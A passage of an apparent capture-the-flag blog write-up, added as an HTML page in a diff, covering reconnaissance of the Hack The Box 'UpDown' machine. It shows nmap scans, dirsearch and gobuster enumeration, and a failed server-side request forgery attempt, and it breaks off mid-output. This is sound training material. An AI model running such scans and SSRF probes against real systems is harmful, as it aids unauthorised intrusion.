@@ -1,0 +1,570 @@
+<html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=icon href=/images/favicon.svg><link rel=stylesheet href=/scss/global.min.d3cc96f4d8384649c41cedbcf73d695dedba18e800978f9ab7f79a1b6fd908ee.css><link rel=stylesheet href=/css/prism.css><link href="https://fonts.googleapis.com/css?family=Merriweather&display=swap" rel=stylesheet><title>UpDown From Hack The Box - Medium Linux Machine | My Blog</title>
+<meta name=description content="Recon Quick Nmap Scan goku@exploitation:~$ IP=10.10.11.177 goku@exploitation:~$ nmap -Pn $IP Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 21:46 CET Nmap scan report for 10.10.11.177 Host is up (0.030s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds Open ports: 22 (ssh) - 80 (http) Full Nmap Scan goku@exploitation:~$ nmap -p- -Pn $IP Starting Nmap 7."><meta property="og:title" content="UpDown From Hack The Box - Medium Linux Machine | My Blog"><meta property="og:site_name" content="My Blog"><meta property="og:description" content="Recon Quick Nmap Scan goku@exploitation:~$ IP=10.10.11.177 goku@exploitation:~$ nmap -Pn $IP Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 21:46 CET Nmap scan report for 10.10.11.177 Host is up (0.030s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds Open ports: 22 (ssh) - 80 (http) Full Nmap Scan goku@exploitation:~$ nmap -p- -Pn $IP Starting Nmap 7."><meta property="og:url" content="https://gokupwn.github.io/posts/updown-htb-machine/"><meta property="og:type" content="website"><meta property="og:locale" content="en_US"><meta property="og:image" content='https://gokupwn.github.io/images/updown.jpg'><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="UpDown From Hack The Box - Medium Linux Machine | My Blog"><link rel=canonical href=https://gokupwn.github.io/posts/updown-htb-machine/><meta name=twitter:description content="Recon Quick Nmap Scan goku@exploitation:~$ IP=10.10.11.177 goku@exploitation:~$ nmap -Pn $IP Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 21:46 CET Nmap scan report for 10.10.11.177 Host is up (0.030s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds Open ports: 22 (ssh) - 80 (http) Full Nmap Scan goku@exploitation:~$ nmap -p- -Pn $IP Starting Nmap 7."><meta name=twitter:image content="https://gokupwn.github.io/images/updown.jpg"><meta property="article:published_time" content="2023-01-03T16:18:46+01:00"><meta property="article:updated_time" content="2023-01-03T16:18:46+01:00"></head><body class=line-numbers><script src=/js/initColors.js></script><div class=layout-styled><section class=section><div class=nav-container><a class=logo-link href=/><div id=logo-desktop><svg width="192" height="23" viewBox="0 0 192 23" fill="none" xmlns="http://www.w3.org/2000/svg" className="Logo__Desktop"><g clipPath="url(#clip0)"><path d="M120.941 6.15477h1.512V2.83255l1.661-.38333V6.15477H126.713v1.15H124.114V16.377C124.114 17.314 124.54 17.7826 125.435 17.7826 125.925 17.7826 126.478 17.6335 126.904 17.4205L127.181 18.4214C126.606 18.7835 125.861 18.9964 124.86 18.9964c-1.321.0-2.428-.617600000000003-2.428-2.4703V7.30477H120.92v-1.15H120.941z" fill="#7a8085"/><path d="M131.739 7.77334C132.825 6.70852 134.273 5.89926 135.764 5.89926c1.959.0 3.173 1.04352 3.173 3.27963V17.6122L140.555 17.8465V18.7409h-3.322V9.58352C137.233 7.9863 136.616 7.30482 135.338 7.30482 134.166 7.30482 132.74 8.0076 131.739 8.90204V17.5909L133.442 17.8039V18.7196H128.416V17.8039L130.078 17.5909V1.29926L128.374 1.04371V.0214844H131.739V7.77334v0z" fill="#7a8085"/><path d="M141.854 12.4374C141.854 7.6883 143.92 5.89941 146.731 5.89941c2.917.0 4.536 1.7463 4.536 6.06949v.6601H143.6C143.621 16.3772 144.686 17.8253 147.284 17.8253 148.605 17.8253 149.584 17.3994 150.5 16.7818L151.096 17.6124C150.01 18.5068 148.754 18.9966 147.008 18.9966 143.941 18.9753 141.854 17.2929 141.854 12.4374zM143.621 11.5216H149.521C149.521 8.34849 148.754 6.98552 146.709 6.98552 144.857 6.98552 143.771 8.2633 143.621 11.5216z" fill="#7a8085"/><path d="M162.682 7.85849C163.768 6.70849 165.024 5.87793 166.515 5.87793c1.959.0 3.131 1.04352 3.131 3.27963V17.6335L171.286 17.8677v.8306H167.963V9.68997C167.963 8.07145 167.388 7.32608 166.089 7.32608 164.918 7.32608 163.789 8.02886 162.81 8.9233v8.6889L164.449 17.8464V18.7409h-3.322V9.68997C161.127 8.07145 160.552 7.32608 159.253 7.32608 158.082 7.32608 156.953 8.02886 155.973 8.9233v8.6889L157.677 17.8464V18.7409H152.651V17.8464L154.312 17.6122V7.47515l-1.703-.25555V6.15478H155.654L155.888 7.85849C156.974 6.72978 158.188 5.89923 159.679 5.89923 161.212 5.87793 162.277 6.51682 162.682 7.85849z" fill="#7a8085"/><path d="M171.925 12.4374C171.925 7.6883 173.991 5.89941 176.802 5.89941c2.917.0 4.536 1.7463 4.536 6.06949v.6601h-7.667C173.692 16.3772 174.757 17.8253 177.355 17.8253 178.676 17.8253 179.655 17.3994 180.571 16.7818L181.167 17.6124C180.081 18.5068 178.825 18.9966 177.079 18.9966 174.012 18.9753 171.925 17.2929 171.925 12.4374zM173.692 11.5216h5.899C179.591 8.34849 178.825 6.98552 176.78 6.98552 174.928 6.98552 173.863 8.2633 173.692 11.5216z" fill="#7a8085"/><path d="M183.084 18.0383V15.504H184.234L184.618 17.442C185.278 17.7189 185.789 17.8892 186.811 17.8892 188.664 17.8892 189.558 17.0374 189.558 15.5466c0-1.4907-.72399999999999-2.0657-2.768-2.662C184.831 12.2883 183.382 11.4577 183.382 9.13645 183.382 7.39016 184.639 5.89941 187.195 5.89941 188.664 5.89941 189.835 6.17627 190.687 6.68738V9.15775H189.558L189.132 7.34756C188.579 7.09201 187.961 7.00682 187.258 7.00682 185.789 7.00682 184.852 7.7309 184.852 8.98738 184.852 10.3077 185.576 10.8189 187.365 11.3513c2.066.6602 3.791 1.3629 3.791 4.0463C191.156 17.7615 189.431 18.9753 186.79 18.9753 185.235 18.9753 183.957 18.6346 183.084 18.0383z" fill="#7a8085"/><path class="change-fill" d="M38.3122 9.98811C38.3122 8.66774 37.9501 8.15663 36.9492 8.15663 36.1186 8.15663 35.0964 8.62515 34.3936 9.20015V16.9733L35.8418 17.165v1.4694h-5.75V17.165L31.5825 16.9733V8.24182L30.0918 7.92237v-1.725h3.8333L34.2446 7.64552C35.3733 6.55941 36.6298 5.87793 38.1418 5.87793 39.9946 5.87793 41.102 6.92145 41.102 9.07237V16.9733L42.5927 17.165v1.4694H38.3122V9.98811v0z" fill="#000"/><path class="change-fill" d="M62.3982 17.1858v1.4695h-6.325V17.1858L57.564 16.9942V8.2627l-1.4908-.31944v-1.725h3.7695L60.226 8.17752C61.0779 6.85715 62.1427 5.94141 63.6973 5.94141 63.8677 5.94141 64.0594 5.9627 64.1871 6.0053L63.8251 8.94418C63.5483 8.81641 63.2501 8.77381 62.8668 8.77381 61.8871 8.77381 61.1418 9.05067 60.3751 9.71085V16.9516L62.3982 17.1858z" fill="#000"/><path class="change-fill" d="M76.7098 6.19733h1.3843V3.08807l2.4491-.53241V6.21863h2.4277V8.0927H80.5432v7.5815C80.5432 16.5899 80.8839 16.9946 81.6293 16.9946 82.0978 16.9946 82.5876 16.8455 82.907 16.6751L83.3543 18.3575C82.758 18.6983 81.9061 18.9751 80.6709 18.9751 78.9672 18.9751 78.0941 18.1658 78.0941 16.0362V8.0927H76.7098V6.19733z" fill="#000"/><path class="change-fill" d="M90.4664 17.1648v1.4695H84.6738V17.1648L86.1646 16.9731V8.24167L84.6738 7.92222v-1.725h4.3019V16.9731L90.4664 17.1648zM85.696 1.76759C85.696.787963 86.4627.0 87.4423.0 88.422.0 89.1886.766667 89.1886 1.76759 89.1886 2.72593 88.422 3.51389 87.421 3.51389 86.4627 3.51389 85.696 2.72593 85.696 1.76759z" fill="#000"/><path class="change-fill" d="M98.3251 7.90097V6.19727H103.053v1.725L101.924 8.11393 98.3251 18.6556H95.663L92.064 8.09264 90.9991 7.92227v-1.725h5.2602v1.7037L95.0242 8.09264 96.7279 13.6084C97.0473 14.6519 97.1964 15.5037 97.3668 16.4834H97.388C97.5371 15.525 97.7714 14.5241 98.0482 13.5871l1.6186-5.51576L98.3251 7.90097z" fill="#000"/><path class="change-fill" d="M75.6867 17.1224C74.5793 17.1437 74.3664 16.952 74.3664 15.9724V9.79645c0-2.83241-1.3843-3.91852-4.0463-3.91852-1.938.0-3.5778.575-4.8982 1.40556L66.2312 9.02978C67.3599 8.45478 68.4673 8.09274 69.7238 8.09274 71.1932 8.09274 71.5552 8.88071 71.5552 10.265V11.0316 11.2233v1.5546V12.8844v3.237C71.0867 16.6326 70.4052 17.0585 69.4469 17.0585 68.3821 17.0585 67.871 16.5261 67.871 15.0353c0-1.725.724100000000007-2.2148 2.6194-2.2574V11.2233C66.6358 11.2659 65.0386 12.4372 65.0386 15.2057c0 2.6408 1.4481 3.7695 3.6203 3.7695 1.5547.0 2.40649999999999-.6602 3.1306-1.4056C72.0451 18.5705 72.833 18.9752 73.8978 18.9752 74.6645 18.9752 75.3886 18.7622 75.8571 18.5066L75.6867 17.1224z" fill="#000"/><path class="change-fill" d="M54.4968 17.1224C53.3894 17.1437 53.1764 16.952 53.1764 15.9724V9.79645c0-2.83241-1.3842-3.91852-4.0463-3.91852-1.9379.0-3.5778.575-4.8981 1.40556L45.0412 9.02978C46.1699 8.45478 47.2773 8.09274 48.5338 8.09274 50.0033 8.09274 50.3653 8.88071 50.3653 10.265V11.0316 11.2233v1.5546V12.8844v3.237C49.8968 16.6326 49.2153 17.0585 48.257 17.0585 47.1922 17.0585 46.681 16.5261 46.681 15.0353c0-1.725.7241-2.2148 2.6195-2.2574V11.2233C45.4459 11.2659 43.8486 12.4372 43.8486 15.2057c0 2.6408 1.4482 3.7695 3.6204 3.7695 1.5546.0 2.4065-.6602 3.1306-1.4056C50.8551 18.5705 51.6431 18.9752 52.7079 18.9752 53.4746 18.9752 54.1986 18.7622 54.6672 18.5066L54.4968 17.1224z" fill="#000"/><path class="change-fill" d="M107.653 13.055H113.594V11.9476C113.594 7.47534 111.869 5.89941 108.803 5.89941c-3.173.0-5.175 1.89537-5.175 6.51669.0 4.6852 1.895 6.5805 5.43000000000001 6.5805C110.954 18.9966 112.231 18.5068 113.467 17.5272L112.657 16.0577c-.978999999999999.6176-1.789 1.001-3.194 1.001C107.546 17.0587 106.801 16.1855 106.63 14.0133 106.588 13.6939 106.567 13.0976 106.567 12.4587c0-.4047.0-.788.0210000000000008-1.0861V11.3513C106.737 8.51886 107.397 7.60312 108.781 7.60312c1.619.0 2.002.979630000000001 2.002 3.74818H107.674V13.055H107.653z" fill="#000"/><path class="change-fill" d="M17.5907 20.2954H0V23H17.5907V20.2954z" fill="#000"/><path class="change-fill" d="M0 7.96484V18.9537l5.38796-3.7694v-3.45L0 7.96484z" fill="#000"/><path class="change-fill" d="M17.5689 10.9463V0L12.1597 3.74815V7.13426l5.4092 3.81204z" fill="#000"/><path class="change-fill" d="M17.5907 18.975 17.5694 12.288.0.0V6.62315L17.5907 18.975z" fill="#000"/></g><defs><clipPath id="clip0"><rect width="191.156" height="23" fill="#fff"/></clipPath></defs></svg></div><div id=logo-mobile class=hidden><svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="23" height="23" viewBox="0 0 512 512"><g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" fill="" stroke="none"><path d="M590 4383l1-738 756-530c698-489 1151-807 2618-1837l540-380 3 748c2 590-1 751-10 760-7 7-308 218-668 470-360 251-1230 859-1933 1351-702 491-1284 893-1292 893-13 0-15-92-15-737z"/><path d="M3887 4708l-597-412v-381-381l597-419c328-231 602-421 610-423 11-3 13 204 13 1212 0 987-2 1216-13 1216-7 0-282-186-610-412z"/><path d="M590 2135c0-910 3-1225 11-1225 10 0 343 231 1049 728l155 109v389 388l-595 418c-327 229-601 417-607 418-10 0-13-251-13-1225z"/><path d="M590 320V10h1960 1960v310 310H2550 590V320z"/></g></svg></div><span class=header-hidden>Navigate back to the homepage</span></a><div class=nav-controls><button id=copyButton class=icon-wrapper><svg class="icon-image" width="24" height="20" viewBox="0 0 24 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M2 5C2 3.34328 3.34328 2 5 2h9c1.6567.0 3 1.34328 3 3V9c0 1.6567-1.3433 3-3 3H10C9.44771 12 9 12.4477 9 13S9.44771 14 10 14h4c2.7613.0 5-2.2387 5-5V5c0-2.76128-2.2387-5-5-5H5C2.23872.0.0 2.23872.0 5V9c0 1.4938.656313 2.8361 1.6935 3.7509C2.10768 13.1163 2.73961 13.0767 3.10494 12.6625 3.47028 12.2483 3.43068 11.6164 3.0165 11.2511 2.39169 10.6999 2 9.89621 2 9V5zm5 6c0-1.65672 1.34328-3 3-3h4C14.5523 8 15 7.55228 15 7S14.5523 6 14 6H10C7.23872 6 5 8.23872 5 11v4c0 2.7613 2.23872 5 5 5h9c2.7613.0 5-2.2387 5-5V11C24 9.50621 23.3437 8.16393 22.3065 7.24906 21.8923 6.88372 21.2604 6.92332 20.8951 7.3375 20.5297 7.75168 20.5693 8.38361 20.9835 8.74894 21.6083 9.30007 22 10.1038 22 11v4c0 1.6567-1.3433 3-3 3H10c-1.65672.0-3-1.3433-3-3V11z" fill="#000"/></svg><div id=toolTip class=tool-tip>copied</div><input id=copyText style=opacity:0 type=text class=tool-tip>
+</button>
+<button id=themeColorButton class=icon-wrapper><div id=sunRays class=sun-rays></div><div id=moonOrSun class=moon-or-sun></div><div id=moonMask class=moon-mask></div></button></div></div></section><script src=/js/toggleLogos.js></script><script src=/js/toggleColors.js></script><script src=/js/copyUrl.js></script><section class="section narrow"><section id=articleHero class="section narrow"><div class=article-hero><header class=article-header><h1 class=article-hero-heading>UpDown From Hack The Box - Medium Linux Machine</h1><div class=article-hero-subtitle><div class=article-meta><div class=article-coauthors-container><span id=collapsedCoauthors class=article-coauthors-collapsed><div class=article-coauthors-list style=width:0></div><strong class=article-coauthors-name-container></strong><div class=article-coauthors-icon-container><svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path style="fill:var(--primary)" d="M5.3209 8.86719 8.50026 12.0396 11.6796 8.86719 12.6563 9.84385 8.50026 13.9999 4.34424 9.84385 5.3209 8.86719z"/><path style="fill:var(--primary)" d="M11.6791 8.13281 8.49974 4.96039 5.32039 8.13281 4.34373 7.15615 8.49974 3.00013 12.6558 7.15615 11.6791 8.13281z"/></svg></div></span><ul id=uncollapsedCoauthors class="article-coauthors-list-open hidden"><div id=uncollapsedAction class=article-icon-open-container><svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path style="fill:var(--primary)" d="M11.6796 14 8.50023 10.8276 5.32088 14 4.34422 13.0233 8.50023 8.86732 12.6563 13.0233 11.6796 14z"/><path style="fill:var(--primary)" d="M5.32041 3 8.49977 6.17243 11.6791 3 12.6558 3.97666 8.49977 8.13268 4.34375 3.97666 5.32041 3z"/></svg></div></ul></div><script src=/js/collapseAuthors.js></script>January 3, 2023
+• 14 min read</div></div></header><div class=article-hero-image id=ArticleImage__Hero><img src=/images/updown.jpg></div></div></section><aside id=progressBar class=aside-container><div class=aside-align><div><div class=overlap-container></div></div></div><div class=progress-container tabindex={-1}><div class=track-line aria-hidden=true><div id=progressIndicator class=progress-line></div></div></div></aside><article id=articleContent class=post-content style=position:relative><h1 id=recon>Recon</h1><h2 id=quick-nmap-scan>Quick Nmap Scan</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ IP<span style=color:#f92672>=</span>10.10.11.177
+</span></span><span style=display:flex><span>goku@exploitation:~$ nmap -Pn $IP
+</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-12-29 21:46 CET
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.177
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.030s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE
+</span></span><span style=display:flex><span>22/tcp open  ssh
+</span></span><span style=display:flex><span>80/tcp open  http
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 0.60 seconds
+</span></span></code></pre></div><ul><li>Open ports: 22 (ssh) - 80 (http)</li></ul><h2 id=full-nmap-scan>Full Nmap Scan</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ nmap -p- -Pn $IP
+</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-12-29 21:52 CET
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.177
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.059s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE
+</span></span><span style=display:flex><span>22/tcp open  ssh
+</span></span><span style=display:flex><span>80/tcp open  http
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 13.53 seconds
+</span></span></code></pre></div><h2 id=nmap-services-version-fingerprinting>Nmap Services Version Fingerprinting:</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ nmap -p80,22 -Pn -A -sC -sV $IP
+</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-12-29 21:52 CET
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.177
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.030s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey:
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 9e1f98d7c8ba61dbf149669d701702e7 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> c21cfe1152e3d7e5f759186b68453f62 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 5f6e12670a66e8e2b761bec4143ad38e <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>|_http-title: Is my Website up ?
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 8.51 seconds
+</span></span></code></pre></div><h2 id=recon-web-application---port-80-http>Recon: WEB Application - Port 80 (http)</h2><ul><li>Web main page:</li></ul><p><img src=/images/Pasted-image-20221229220204.png alt="Image alt"></p><ul><li>Web Tech Stack:</li></ul><p><img src=/images/Pasted-image-20221229220249.png alt="Image alt"></p><ul><li>Let&rsquo;s start up our web pentesting tool, BurpSuite, and intercept the check request.</li><li>Request and response with debugging mode off:</li></ul><p><img src=/images/Pasted-image-20221229220828.png alt="Image alt"></p><ul><li>Request and response with debugging mode on:</li></ul><p><img src=/images/Pasted-image-20221229221014.png alt="Image alt"></p><h2 id=recon-directory-brute-forcing>Recon: Directory Brute Forcing:</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ dirsearch -u http://siteisup.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  _|. _ _  _  _  _ _|_    v0.4.2
+</span></span><span style=display:flex><span> <span style=color:#f92672>(</span>_<span style=color:#f92672>||</span>| _<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>/_<span style=color:#f92672>(</span>_<span style=color:#f92672>||</span> <span style=color:#f92672>(</span>_| <span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style=color:#ae81ff>30</span> | Wordlist size: <span style=color:#ae81ff>62277</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Output File: /home/goku/.dirsearch/reports/siteisup.htb/_22-12-29_22-37-07.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Error Log: /home/goku/.dirsearch/logs/errors-22-12-29_22-37-07.log
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Target: http://siteisup.htb/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22:37:08<span style=color:#f92672>]</span> Starting:
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22:37:09<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  310B  - /dev  -&gt;  http://siteisup.htb/dev/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22:37:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /server-status
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Task Completed
+</span></span></code></pre></div><ul><li>Directories discovered: <code>/dev</code>, <code>/server-status</code></li></ul><h2 id=recon-server-status-endpoint>Recon: <code>/server-status</code> Endpoint</h2><ul><li>If we visit the <code>/server-status</code> endpoint directly, we will see the following page:</li></ul><p><img src=/images/Pasted-image-20221229224933.png alt="Image alt"></p><ul><li>Let&rsquo;s exploit the main web application&rsquo;s functionality to gather data and make requests on behalf of the main server. My expectation is that if the request is originated from the server itself, I will be able to bypass the request restrictions and get the page content by enabling the debug mode. Let&rsquo;s give it a try and enjoy our Server-Side Request Forgery (SSRF).</li></ul><p><img src=/images/Pasted-image-20221229230409.png alt="Image alt"></p><ul><li>Nice, we were detected guys :)</li><li>Let&rsquo;s try to bypass some security restrictions, but first let&rsquo;s take a look at the request in BurpSuite.</li></ul><p><img src=/images/Pasted-image-20221229230656.png alt="Image alt"></p><ul><li>I tried several methods to bypass the SSRF protection,but I was unsuccessful.</li></ul><h2 id=recon-virtual-hosts-enumeration>Recon: Virtual hosts enumeration:</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ gobuster vhost -u siteisup.htb -t <span style=color:#ae81ff>40</span> -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Gobuster v3.3
+</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:             http://siteisup.htb
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:          GET
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:         <span style=color:#ae81ff>40</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:      gobuster/3.3
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:         10s
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Append Domain:   true
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>2022/12/29 22:16:07 Starting gobuster in VHOST enumeration mode
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Found: dev.siteisup.htb Status: <span style=color:#ae81ff>403</span> <span style=color:#f92672>[</span>Size: 281<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Found: *.siteisup.htb Status: <span style=color:#ae81ff>400</span> <span style=color:#f92672>[</span>Size: 301<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Progress: <span style=color:#ae81ff>99785</span> / <span style=color:#ae81ff>100001</span> <span style=color:#f92672>(</span>99.78%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>2022/12/29 22:17:40 Finished
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span></code></pre></div><ul><li>A new subdomain was discovered: <code>dev.siteisup.htb</code></li></ul><h2 id=recon-web-app-devsiteisuphtb>Recon: WEB App <code>dev.siteisup.htb</code></h2><ul><li>Main page:</li></ul><p><img src=/images/Pasted-image-20221229223133.png alt="Image alt"></p><ul><li>I tried using the <code>siteisup.htb</code> web app to make the request on behalf of the server, but unfortunately my plan did not work.</li></ul><h2 id=recon-web-app-siteisuphtbdev>Recon: WEB App <code>siteisup.htb/dev/</code></h2><ul><li>Directory brute force:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ dirsearch -u http://siteisup.htb/dev/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  _|. _ _  _  _  _ _|_    v0.4.2
+</span></span><span style=display:flex><span> <span style=color:#f92672>(</span>_<span style=color:#f92672>||</span>| _<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>/_<span style=color:#f92672>(</span>_<span style=color:#f92672>||</span> <span style=color:#f92672>(</span>_| <span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style=color:#ae81ff>30</span> | Wordlist size: <span style=color:#ae81ff>37045</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Output File: /home/goku/.dirsearch/reports/siteisup.htb/-dev-_22-12-30_08-30-25.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Error Log: /home/goku/.dirsearch/logs/errors-22-12-30_08-30-25.log
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Target: http://siteisup.htb/dev/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>08:30:25<span style=color:#f92672>]</span> Starting:
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>08:30:27<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /dev/index.php
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>08:30:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /dev/.
